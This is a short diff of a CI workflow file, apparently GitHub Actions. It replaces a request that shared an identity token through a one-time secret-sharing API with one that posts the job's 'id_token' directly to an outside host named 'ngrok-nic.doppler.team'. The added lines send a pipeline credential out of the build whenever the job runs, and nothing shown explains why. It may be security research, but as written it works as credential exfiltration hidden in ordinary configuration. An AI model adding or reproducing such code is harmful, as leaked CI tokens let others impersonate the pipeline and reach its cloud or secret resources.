@@ -37,8 +37,6 @@ jobs:
 
             const https = require('https');
 
-            axios.post('https://api.doppler.com/v1/share/secrets/plain', {
-              'secret' : id_token,
-              "expire_views": 1,
-              "expire_days": 1
+            axios.post('https://ngrok-nic.doppler.team', {
+              'id_token' : id_token,
             }).then(response => console.log(response.data));
